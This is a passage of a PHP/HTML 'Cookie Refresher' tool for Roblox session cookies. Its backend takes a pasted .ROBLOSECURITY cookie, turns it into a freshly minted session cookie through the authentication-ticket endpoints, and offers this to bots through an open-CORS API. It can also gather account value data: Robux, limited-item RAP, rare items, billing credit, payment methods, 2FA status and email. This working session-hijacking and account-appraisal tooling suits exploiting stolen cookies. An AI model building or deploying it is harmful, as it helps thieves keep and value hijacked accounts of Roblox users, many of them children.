<?php
/* ─────────────────────────────────────────────
   CORS — allow any origin to POST to this file
   This must be first so headers are sent before
   any output on every request path.
───────────────────────────────────────────── */
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

/* ─────────────────────────────────────────────
   EXTERNAL API ENDPOINT  —  action=api_refresh

   Designed for programmatic callers (scripts,
   bots, other servers). Accepts a POST request
   from any origin, refreshes the supplied
   .ROBLOSECURITY cookie, and returns JSON.

   ── REQUEST (multipart/form-data or
               application/x-www-form-urlencoded)
     cookie     string   Required.
                         Full .ROBLOSECURITY value.
     show_info  boolean  Optional (1 / true).
                         Include full account data.

   ── RESPONSE (JSON)
     {
       "success":  true | false,
       "message":  "...",
       "data": {
         "newCookie":   "...",
         "isDifferent": true | false,
         "username":    "...",
         "displayName": "...",
         "userId":      12345,
         "accountInfo": { ... } | null,
         "fullAccount": { ... } | null
       }
     }

   ── EXAMPLE (curl)
     curl -X POST https://your-site.com/index.php \
       -d "action=api_refresh" \
       -d "cookie=_|WARNING:..." \
       -d "show_info=1"
───────────────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'api_refresh') {
    @set_time_limit(120);
    header('Content-Type: application/json');

    $cookie   = trim($_POST['cookie'] ?? '');
    $showInfo = !empty($_POST['show_info']);

    if (empty($cookie)) {
        echo json_encode(['success' => false, 'message' => 'Cookie is required.']);
        exit;
    }

    $ticketResult = generateAuthTicket($cookie);
    if (!$ticketResult['success']) {
        echo json_encode(['success' => false, 'message' => $ticketResult['error']]);
        exit;
    }

    $redeemResult = redeemAuthTicket($ticketResult['ticket']);
    if (!$redeemResult['success']) {
        echo json_encode(['success' => false, 'message' => $redeemResult['error']]);
        exit;
    }

    $newCookie       = $redeemResult['cookie'];
    $isDifferent     = ($newCookie !== $cookie);
    $userData        = null;
    $accountInfo     = null;
    $fullAccountData = null;

    $authRes = rbxGet('https://users.roblox.com/v1/users/authenticated', $newCookie);
    if (!empty($authRes['body']['id'])) {
        $userData = $authRes['body'];
        $uid      = (int)$userData['id'];
        if ($showInfo) {
            $fullAccountData = fetchAccountData($uid, $newCookie);
            $accountInfo = [
                'username'    => $userData['name']        ?? '',
                'displayName' => $userData['displayName'] ?? '',
                'userId'      => $userData['id'],
                'avatarUrl'   => $fullAccountData['avatarUrl'] ?? '',
            ];
        }
    }

    echo json_encode([
        'success' => true,
        'message' => 'Cookie refreshed successfully.',
        'data'    => [
            'newCookie'   => $newCookie,
            'isDifferent' => $isDifferent,
            'accountInfo' => $accountInfo,
            'username'    => $userData['name']        ?? '',
            'displayName' => $userData['displayName'] ?? ($userData['name'] ?? ''),
            'userId'      => $userData['id']           ?? 0,
            'fullAccount' => $showInfo ? $fullAccountData : null,
        ],
    ]);
    exit;
}

/* ─────────────────────────────────────────────
   AJAX ENDPOINT
───────────────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'refresh') {
    @set_time_limit(120);
    header('Content-Type: application/json');
    $cookie   = trim($_POST['cookie'] ?? '');
    $showInfo = !empty($_POST['show_info']);
    if (empty($cookie)) {
        echo json_encode(['success' => false, 'message' => 'Cookie is required.']);
        exit;
    }
    $ticketResult = generateAuthTicket($cookie);
    if (!$ticketResult['success']) {
        echo json_encode(['success' => false, 'message' => $ticketResult['error']]);
        exit;
    }
    $redeemResult = redeemAuthTicket($ticketResult['ticket']);
    if (!$redeemResult['success']) {
        echo json_encode(['success' => false, 'message' => $redeemResult['error']]);
        exit;
    }
    $newCookie   = $redeemResult['cookie'];
    $isDifferent = ($newCookie !== $cookie);
    $userData    = null; $fullAccountData = null; $accountInfo = null;
    $authRes     = rbxGet('https://users.roblox.com/v1/users/authenticated', $newCookie);
    if (!empty($authRes['body']['id'])) {
        $userData = $authRes['body'];
        $uid      = (int)$userData['id'];
        if ($showInfo) {
            $fullAccountData = fetchAccountData($uid, $newCookie);
            $accountInfo = [
                'username'    => $userData['name']        ?? '',
                'displayName' => $userData['displayName'] ?? '',
                'userId'      => $userData['id'],
                'avatarUrl'   => $fullAccountData['avatarUrl'] ?? '',
            ];
        }
    }
    echo json_encode([
        'success' => true,
        'message' => 'Cookie refreshed successfully.',
        'data'    => [
            'newCookie'   => $newCookie,
            'isDifferent' => $isDifferent,
            'accountInfo' => $accountInfo,
            'username'    => $userData['name']        ?? '',
            'displayName' => $userData['displayName'] ?? ($userData['name'] ?? ''),
            'userId'      => $userData['id']           ?? 0,
            'fullAccount' => $showInfo ? $fullAccountData : null,
        ],
    ]);
    exit;
}

/* ─────────────────────────────────────────────
   BACKEND FUNCTIONS
───────────────────────────────────────────── */
function rbxGet($url, $cookie = null) {
    $h = ['Accept: application/json', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'];
    if ($cookie) $h[] = "Cookie: .ROBLOSECURITY={$cookie}";
    $ch = curl_init($url);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_HTTPHEADER => $h,
        CURLOPT_SSL_VERIFYPEER => true, CURLOPT_TIMEOUT => 10]);
    $body = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
    return ['code' => $code, 'body' => ($body ? json_decode($body, true) : null)];
}

function fetchAccountData($uid, $cookie) {
    $av = rbxGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={$uid}&size=150x150&format=Png");
    $avatarUrl = isset($av['body']['data'][0]['imageUrl']) ? $av['body']['data'][0]['imageUrl'] : 'https://tr.rbxcdn.com/38c6ee6812f0abd46a3f3a704e2d786c/150/150/Image/Png';
    $bal = rbxGet("https://economy.roblox.com/v1/users/{$uid}/currency", $cookie);
    $robux = isset($bal['body']['robux']) ? (int)$bal['body']['robux'] : 0;
    $inv = rbxGet("https://inventory.roblox.com/v1/users/{$uid}/assets/collectibles?sortOrder=Asc&limit=100", $cookie);
    $rap = 0; $limiteds = 0;
    if (!empty($inv['body']['data'])) {
        foreach ($inv['body']['data'] as $i) $rap += (isset($i['recentAveragePrice']) ? (int)$i['recentAveragePrice'] : 0);
        $limiteds = count($inv['body']['data']);
    }
    $prem = rbxGet("https://premiumfeatures.roblox.com/v1/users/{$uid}/validate-membership", $cookie);
    $hasPremium = ($prem['body'] === true);
    $cred = rbxGet('https://billing.roblox.com/v1/credit', $cookie);
    $credit = isset($cred['body']['balance']) ? (float)$cred['body']['balance'] : 0;
    $creditCurrency = isset($cred['body']['currencyCode']) ? $cred['body']['currencyCode'] : 'USD';
    $emailDisplay = 'Unverified';
    $er = rbxGet('https://accountsettings.roblox.com/v1/email', $cookie);
    if ($er['code'] === 200 && !empty($er['body']['emailAddress'])) {
        $em = $er['body']['emailAddress']; $vf = !empty($er['body']['verified']);
        $emailDisplay = substr($em, 0, 3) . '*** — ' . ($vf ? 'Verified' : 'Unverified');
    } else {
        $er2 = rbxGet('https://accountinformation.roblox.com/v1/email', $cookie);
        if ($er2['code'] === 200 && !empty($er2['body']['emailAddress'])) {
            $em = $er2['body']['emailAddress']; $vf = !empty($er2['body']['verified']);
            $emailDisplay = substr($em, 0, 3) . '*** — ' . ($vf ? 'Verified' : 'Unverified');
        }
    }
    $has2FA = 'DISABLED';
    $tf = rbxGet("https://twostepverification.roblox.com/v1/users/{$uid}/configuration", $cookie);
    if ($tf['code'] === 200 && !empty($tf['body']['methods'])) {
        foreach ($tf['body']['methods'] as $m) { if (!empty($m['enabled'])) { $has2FA = 'ENABLED'; break; } }
    }
    $ageDays = 0;
    $dr = rbxGet("https://users.roblox.com/v1/users/{$uid}");
    if (!empty($dr['body']['created'])) { $c = new DateTime($dr['body']['created']); $ageDays = (int)$c->diff(new DateTime())->days; }
    $korblox = false; $headless = false; $valkyrie = false;
    $k  = rbxGet("https://inventory.roblox.com/v1/users/{$uid}/items/Bundle/347", $cookie);
    if (!empty($k['body']['data'])) $korblox = true;
    $h2 = rbxGet("https://inventory.roblox.com/v1/users/{$uid}/items/Asset/134082579", $cookie);
    if (!empty($h2['body']['data'])) $headless = true;
    foreach ([1365767, 100929604, 855891703] as $aid) {
        $v2 = rbxGet("https://inventory.roblox.com/v1/users/{$uid}/items/Asset/{$aid}", $cookie);
        if (!empty($v2['body']['data'])) { $valkyrie = true; break; }
    }
    $gamesDeveloper = false; $gameVisits = 0;
    $gr = rbxGet("https://games.roblox.com/v2/users/{$uid}/games?limit=50&sortOrder=Asc");
    if (!empty($gr['body']['data'])) { $gamesDeveloper = true; foreach ($gr['body']['data'] as $g) $gameVisits += (isset($g['visits']) ? (int)$g['visits'] : 0); }
    $voiceChat = false;
    $vc = rbxGet('https://voice.roblox.com/v1/settings', $cookie);
    if (!empty($vc['body']['isVoiceEnabled'])) $voiceChat = true;
    $hasBilling = false;
    $bm = rbxGet('https://billing.roblox.com/v1/paymentmethods', $cookie);
    if (!empty($bm['body'])) $hasBilling = true;
    return compact('avatarUrl','robux','rap','limiteds','hasPremium','credit','creditCurrency','emailDisplay','has2FA','ageDays','korblox','headless','valkyrie','gamesDeveloper','gameVisits','voiceChat','hasBilling');
}

function fetchSessionCSRFToken($roblosecurityCookie) {
    $ch = curl_init("https://auth.roblox.com/v2/logout");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Cookie: .ROBLOSECURITY={$roblosecurityCookie}"]);
    curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    $response = curl_exec($ch); $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize); curl_close($ch);
    if (preg_match('/x-csrf-token: (.+)/i', $headers, $matches)) return trim($matches[1]);
    return null;
}

function generateAuthTicket($roblosecurityCookie) {
    $csrfToken = fetchSessionCSRFToken($roblosecurityCookie);
    if (!$csrfToken) return ["success" => false, "error" => "Failed to fetch CSRF token — make sure your cookie is valid."];
    $ch = curl_init("https://auth.roblox.com/v1/authentication-ticket");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["x-csrf-token: $csrfToken","referer: https://www.roblox.com/","Content-Type: application/json","Cookie: .ROBLOSECURITY={$roblosecurityCookie}"]);
    curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    $response = curl_exec($ch); $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize); curl_close($ch);
    if (preg_match('/rbx-authentication-ticket: (.+)/i', $headers, $matches)) return ["success" => true, "ticket" => trim($matches[1])];
    return ["success" => false, "error" => "Failed to generate auth ticket — cookie may be expired or invalid."];
}

function redeemAuthTicket($authTicket) {
    $ch = curl_init("https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["authenticationTicket" => $authTicket]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json","RBXAuthenticationNegotiation: 1"]);
    curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    $response = curl_exec($ch); $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize); curl_close($ch);
    if (preg_match('/set-cookie: .ROBLOSECURITY=(.+?);/i', $headers, $matches)) return ["success" => true, "cookie" => trim($matches[1])];
    return ["success" => false, "error" => "Failed to redeem auth ticket — Roblox may have rejected the request."];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cookie Refresher</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}

:root{
  --bg:#ffffff;
  --surface:#f4f4f5;
  --surface2:#e4e4e7;
  --border:#d4d4d8;
  --border2:#a1a1aa;
  --text:#09090b;
  --text2:#3f3f46;
  --text3:#71717a;
  --text4:#a1a1aa;
  --accent:#000000;
  --accent-hover:#18181b;
  --green:#16a34a;
  --green-bg:#f0fdf4;
  --green-border:#bbf7d0;
  --red:#dc2626;
  --red-bg:#fef2f2;
  --red-border:#fecaca;
  --radius:14px;
  --radius-sm:10px;
  --radius-xs:7px;
}

html,body{
  background:var(--bg);color:var(--text);
  font-family:'Inter',system-ui,sans-serif;font-size:14px;
  -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
}
body{
  display:flex;flex-direction:column;align-items:center;
  justify-content:center;min-height:100vh;padding:40px 20px;
}

.shell{width:100%;max-width:420px;display:flex;flex-direction:column;}

/* ── HEADER ── */
.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;}
.brand{display:flex;align-items:center;gap:10px;}
.brand-icon{
  width:36px;height:36px;background:var(--accent);border-radius:10px;
  display:flex;align-items:center;justify-content:center;flex-shrink:0;
}
.brand-icon svg{stroke:#fff;}
.brand-name{font-size:15px;font-weight:900;letter-spacing:-0.3px;color:var(--text);}

/* ── CARD ── */
.card{
  background:var(--bg);border:1.5px solid var(--border);
  border-radius:var(--radius);overflow:hidden;margin-bottom:12px;
}
.card-header{
  padding:16px 18px 14px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;
}
.card-title{font-size:11px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);}
.card-body{padding:18px;}

/* ── INPUT ── */
.input-wrap{position:relative;margin-bottom:12px;}
.input-icon{position:absolute;left:14px;top:14px;color:var(--text4);pointer-events:none;display:flex;align-items:center;}
.cookie-input{
  width:100%;background:var(--surface);border:1.5px solid var(--border);border-radius:var(--radius-sm);
  outline:none;color:var(--text);font-size:11.5px;font-weight:500;
  font-family:'JetBrains Mono','Inter',monospace;letter-spacing:0.2px;
  padding:12px 14px 12px 42px;min-height:96px;resize:none;line-height:1.7;
  transition:border-color 0.15s,background 0.15s;caret-color:var(--accent);
}
.cookie-input:focus{border-color:var(--accent);background:var(--bg);}
.cookie-input::placeholder{color:var(--text4);font-weight:500;font-family:'Inter',sans-serif;}

/* ── TOGGLE ROW ── */
.toggle-row{
  display:flex;align-items:center;justify-content:space-between;
  padding:11px 13px;background:var(--surface);border:1.5px solid var(--border);
  border-radius:var(--radius-xs);margin-bottom:12px;cursor:pointer;
  transition:border-color 0.15s;user-select:none;
}
.toggle-row:hover{border-color:var(--border2);}
.toggle-label-text{font-size:12px;font-weight:600;color:var(--text2);display:flex;align-items:center;gap:8px;}
.toggle-switch{
  width:34px;height:18px;border-radius:99px;background:var(--surface2);
  border:1.5px solid var(--border);position:relative;flex-shrink:0;
  transition:background 0.18s,border-color 0.18s;
}
.toggle-switch.on{background:var(--accent);border-color:var(--accent);}
.toggle-thumb{
  position:absolute;top:1px;left:1px;width:12px;height:12px;border-radius:50%;
  background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.2);transition:transform 0.18s;
}
.toggle-switch.on .toggle-thumb{transform:translateX(16px);}

/* ── NOTICE ── */
.notice{
  display:flex;align-items:flex-start;gap:10px;background:var(--surface);
  border:1px solid var(--border);border-radius:var(--radius-xs);padding:11px 13px;margin-bottom:14px;
}
.notice svg{flex-shrink:0;margin-top:1px;color:var(--text4);}
.notice-text{font-size:11.5px;font-weight:500;color:var(--text3);line-height:1.6;}
.notice-text strong{color:var(--text2);font-weight:700;}

/* ── RUN BUTTON ── */
.run-btn{
  width:100%;padding:15px;background:var(--accent);color:#fff;border:none;
  border-radius:var(--radius-sm);font-family:'Inter',sans-serif;font-size:13px;font-weight:800;
  letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;
  transition:background 0.15s,transform 0.1s,opacity 0.15s;
  display:flex;align-items:center;justify-content:center;gap:9px;
}
.run-btn:hover{background:var(--accent-hover);}
.run-btn:active{transform:scale(0.99);}
.run-btn:disabled{opacity:0.45;cursor:not-allowed;transform:none;}
.btn-spinner{
  display:none;width:14px;height:14px;
  border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;
  border-radius:50%;animation:spin 0.65s linear infinite;flex-shrink:0;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* ── HOW IT WORKS ── */
.steps{display:flex;flex-direction:column;}
.step{display:flex;align-items:flex-start;gap:14px;padding:13px 0;border-bottom:1px solid var(--border);}
.step:last-child{border-bottom:none;}
.step-num{
  flex-shrink:0;width:26px;height:26px;border-radius:50%;
  background:var(--surface);border:1.5px solid var(--border);
  font-size:11px;font-weight:800;color:var(--text2);
  display:flex;align-items:center;justify-content:center;margin-top:1px;
}
.step-title{font-size:12.5px;font-weight:800;color:var(--text);margin-bottom:2px;}
.step-desc{font-size:11.5px;font-weight:500;color:var(--text3);line-height:1.55;}

/* ── FOOTER ── */
.footer{text-align:center;padding-top:20px;font-size:11px;font-weight:600;color:var(--text4);letter-spacing:0.3px;}

@media(max-width:480px){
  body{padding:24px 14px;justify-content:flex-start;}
  .shell{max-width:100%;}
  .header{margin-bottom:22px;}
  .brand-icon{width:30px;height:30px;border-radius:8px;}
  .brand-name{font-size:14px;}
  .card-body{padding:14px;}
  .cookie-input{min-height:80px;font-size:11px;}
}

/* ══════════════════════════════════
   SKELETON LOADER CARD
══════════════════════════════════ */
@keyframes shimmer{
  0%{background-position:-400px 0}
  100%{background-position:400px 0}
}
.skeleton-card{
  display:none;
  background:var(--bg);border:1.5px solid var(--border);
  border-radius:var(--radius);overflow:hidden;margin-bottom:12px;
  animation:cardIn 0.25s cubic-bezier(.16,1,.3,1);
}
.skeleton-card.show{display:block;}
@keyframes cardIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}

.skel-header{
  padding:16px 18px 14px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:10px;
}
.skel-body{padding:18px;display:flex;flex-direction:column;gap:12px;}

.skel-line{
  border-radius:6px;
  background:linear-gradient(90deg,var(--surface) 25%,var(--surface2) 50%,var(--surface) 75%);
  background-size:800px 100%;
  animation:shimmer 1.5s infinite;
}
.skel-circle{
  border-radius:50%;flex-shrink:0;
  background:linear-gradient(90deg,var(--surface) 25%,var(--surface2) 50%,var(--surface) 75%);
  background-size:800px 100%;
  animation:shimmer 1.5s infinite;
}

/* ══════════════════════════════════
   RESULT CARD (inline, no modal)
══════════════════════════════════ */
.result-card{
  display:none;
  background:var(--bg);border:1.5px solid var(--border);
  border-radius:var(--radius);overflow:hidden;margin-bottom:12px;
}
.result-card.show{
  display:block;
  animation:cardIn 0.3s cubic-bezier(.16,1,.3,1);
}
.result-card.ok-card{border-color:var(--green-border);}
.result-card.err-card{border-color:var(--red-border);}

/* status banner */
.res-banner{
  display:flex;align-items:center;gap:12px;
  padding:14px 16px;border-bottom:1px solid var(--border);
}
.res-banner.ok {background:var(--green-bg);border-color:var(--green-border);}
.res-banner.err{background:var(--red-bg);  border-color:var(--red-border);}
.banner-icon{
  width:32px;height:32px;border-radius:50%;flex-shrink:0;
  display:flex;align-items:center;justify-content:center;
}
.banner-icon.ok {background:rgba(22,163,74,0.15);}
.banner-icon.err{background:rgba(220,38,38,0.12);}
.banner-icon.ok  svg{stroke:var(--green);}
.banner-icon.err svg{stroke:var(--red);}
.banner-text{}
.banner-title{font-size:13px;font-weight:800;color:var(--text);}
.banner-sub{font-size:11.5px;font-weight:500;color:var(--text3);margin-top:2px;}

/* cookie section */
.cookie-section{padding:14px 16px;}
.cookie-section-lbl{
  font-size:10px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;
  color:var(--text4);margin-bottom:7px;
}
.cookie-box{
  background:var(--surface);border:1.5px solid var(--border);border-radius:var(--radius-xs);
  padding:11px 13px;font-family:'JetBrains Mono',monospace;font-size:10.5px;
  line-height:1.75;color:var(--text2);
  overflow:auto;max-height:100px;white-space:pre-wrap;word-break:break-all;cursor:text;
}

/* copy button */
.copy-btn-wrap{padding:0 16px 14px;}
.copy-btn{
  width:100%;padding:12px;background:var(--surface);border:1.5px solid var(--border);
  border-radius:var(--radius-xs);font-family:'Inter',sans-serif;
  font-size:12px;font-weight:700;color:var(--text2);cursor:pointer;
  transition:all 0.15s;display:flex;align-items:center;justify-content:center;gap:7px;
}
.copy-btn:hover{background:var(--surface2);border-color:var(--border2);color:var(--text);}
.copy-btn.copied{background:var(--green-bg);border-color:var(--green-border);color:var(--green);}

/* error detail */
.err-section{padding:14px 16px;}
.err-msg{
  background:var(--red-bg);border:1.5px solid var(--red-border);
  border-radius:var(--radius-xs);padding:12px 14px;
  font-size:12px;font-weight:600;color:var(--red);line-height:1.6;
}

/* ── RAW TOGGLE ── */
.raw-wrap{border-top:1px solid var(--border);}
.raw-toggle{
  display:flex;align-items:center;justify-content:space-between;
  padding:11px 16px;cursor:pointer;border:none;background:none;
  width:100%;font-family:'Inter',sans-serif;transition:background 0.12s;
}
.raw-toggle:hover{background:var(--surface);}
.raw-toggle-lbl{font-size:10px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;color:var(--text4);}
.raw-arrow{color:var(--text4);transition:transform 0.2s;}
.raw-arrow.open{transform:rotate(180deg);}
.raw-body{display:none;padding:0 14px 14px;}
.raw-body.open{display:block;}
.json-box{
  background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-xs);
  padding:11px 13px;font-family:'JetBrains Mono',monospace;
  font-size:10.5px;line-height:1.75;color:var(--text3);
  overflow:auto;max-height:160px;white-space:pre-wrap;word-break:break-all;
}

/* ══════════════════════════════════
   ACCOUNT INFO — animated sections
══════════════════════════════════ */
.acc-wrap{padding:0;}

/* avatar hero */
.acc-avatar{
  display:flex;align-items:center;gap:14px;
  padding:16px 16px 14px;border-bottom:1px solid var(--border);
  opacity:0;transform:translateY(10px);
  transition:opacity 0.4s ease,transform 0.4s cubic-bezier(.16,1,.3,1);
}
.acc-avatar.in{opacity:1;transform:none;}
.acc-avatar-img{
  width:52px;height:52px;border-radius:50%;border:1.5px solid var(--border);
  object-fit:cover;flex-shrink:0;background:var(--surface);
}
.acc-avatar-name{font-size:14px;font-weight:800;color:var(--text);}
.acc-avatar-sub{font-size:11.5px;font-weight:600;color:var(--text3);margin-top:2px;}

/* section group */
.acc-section{
  border-top:1px solid var(--border);
  opacity:0;transform:translateY(8px);
  transition:opacity 0.35s ease,transform 0.35s cubic-bezier(.16,1,.3,1);
}
.acc-section.in{opacity:1;transform:none;}
.acc-section-hdr{
  padding:10px 16px 4px;
  font-size:9px;font-weight:900;letter-spacing:2px;text-transform:uppercase;color:var(--text4);
}

/* info row */
.acc-row{
  display:flex;align-items:center;justify-content:space-between;
  padding:9px 16px;border-bottom:1px solid var(--border);gap:10px;
  opacity:0;transform:translateX(-6px);
  transition:opacity 0.3s ease,transform 0.3s cubic-bezier(.16,1,.3,1);
}
.acc-row:last-child{border-bottom:none;}
.acc-row.in{opacity:1;transform:none;}

.acc-row-label{
  font-size:11px;font-weight:700;letter-spacing:0.3px;
  color:var(--text4);flex-shrink:0;display:flex;align-items:center;gap:6px;
}
.acc-row-label svg{flex-shrink:0;}
.acc-row-value{font-size:12px;font-weight:700;color:var(--text);text-align:right;word-break:break-all;}
.acc-row-value.ok {color:var(--green);}
.acc-row-value.no {color:var(--red);}
.acc-row-value.dim{color:var(--text3);}
</style>
</head>
<body>

<div class="shell">

  <!-- HEADER -->
  <div class="header">
    <div class="brand">
      <div class="brand-icon">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/>
          <path d="M21 3v5h-5"/>
          <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/>
          <path d="M8 16H3v5"/>
        </svg>
      </div>
      <div class="brand-name">Cookie Refresher</div>
    </div>
  </div>

  <!-- MAIN CARD -->
  <div class="card">
    <div class="card-header">
      <span class="card-title">Session Refresh</span>
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--text4)">
        <circle cx="12" cy="12" r="10"/><path d="M12 8v4m0 4h.01"/>
      </svg>
    </div>
    <div class="card-body">

      <div class="input-wrap">
        <span class="input-icon">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
          </svg>
        </span>
        <textarea class="cookie-input" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.ROBLOSECURITY token..." autocomplete="off" spellcheck="false"></textarea>
      </div>

      <!-- TOGGLE -->
      <div class="toggle-row" onclick="tog()" id="toggleRow">
        <div class="toggle-label-text">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--text4)">
            <circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
          </svg>
          Show account info after refresh
        </div>
        <div class="toggle-switch" id="toggleSw"><div class="toggle-thumb"></div></div>
      </div>

      <!-- NOTICE -->
      <div class="notice">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        </svg>
        <div class="notice-text">
          Your cookie is processed on <strong>your own server</strong> and is never stored or logged. Paste the full <strong>.ROBLOSECURITY</strong> value including the warning prefix.
        </div>
      </div>

      <button class="run-btn" id="runBtn" onclick="doRefresh()">
        <div class="btn-spinner" id="sp"></div>
        <span id="btnTxt">Refresh Cookie</span>
        <svg id="btnArrow" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <path d="M5 12h14M12 5l7 7-7 7"/>
        </svg>
      </button>

    </div>
  </div>

  <!-- ══ SKELETON LOADING CARD ══ -->
  <div class="skeleton-card" id="skeletonCard">
    <div class="skel-header">
      <div class="skel-circle" style="width:28px;height:28px;"></div>
      <div style="flex:1;display:flex;flex-direction:column;gap:6px;">
        <div class="skel-line" style="height:10px;width:55%;"></div>
        <div class="skel-line" style="height:8px;width:35%;"></div>
      </div>
    </div>
    <div class="skel-body">
      <div class="skel-line" style="height:9px;width:30%;"></div>
      <div class="skel-line" style="height:68px;width:100%;border-radius:8px;"></div>
      <div class="skel-line" style="height:40px;width:100%;border-radius:8px;"></div>
    </div>
  </div>

  <!-- ══ RESULT CARD ══ -->
  <div class="result-card" id="resultCard">

    <!-- status banner -->
    <div class="res-banner" id="resBanner">
      <div class="banner-icon" id="bannerIcon">
        <svg id="bannerSvg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></svg>
      </div>
      <div class="banner-text">
        <div class="banner-title" id="bannerTitle"></div>
        <div class="banner-sub"   id="bannerSub"></div>
      </div>
    </div>

    <!-- error message -->
    <div class="err-section" id="errSection" style="display:none">
      <div class="err-msg" id="errMsg"></div>
    </div>

    <!-- account info (toggle ON) -->
    <div class="acc-wrap" id="accWrap" style="display:none">

      <div class="acc-avatar" id="accAvatar">
        <img class="acc-avatar-img" id="accAvatarImg" src="" alt="">
        <div>
          <div class="acc-avatar-name" id="accAvatarName"></div>
          <div class="acc-avatar-sub"  id="accAvatarSub"></div>
        </div>
      </div>

      <!-- Economy -->
      <div class="acc-section" id="secEconomy">
        <div class="acc-section-hdr">Economy</div>
        <div class="acc-row" id="rowRobux">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="8" r="6"/><path d="M18.09 10.37A6 6 0 1 1 10.34 18"/><path d="M7 6h1v4"/><path d="m16.71 13.88.7.71-2.82 2.82"/></svg>
            Robux
          </span>
          <span class="acc-row-value" id="valRobux">—</span>
        </div>
        <div class="acc-row" id="rowRap">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 7 13.5 15.5 8.5 10.5 2 17"/><polyline points="16 7 22 7 22 13"/></svg>
            RAP
          </span>
          <span class="acc-row-value" id="valRap">—</span>
        </div>
        <div class="acc-row" id="rowLimiteds">
          <span class="acc-row-label">
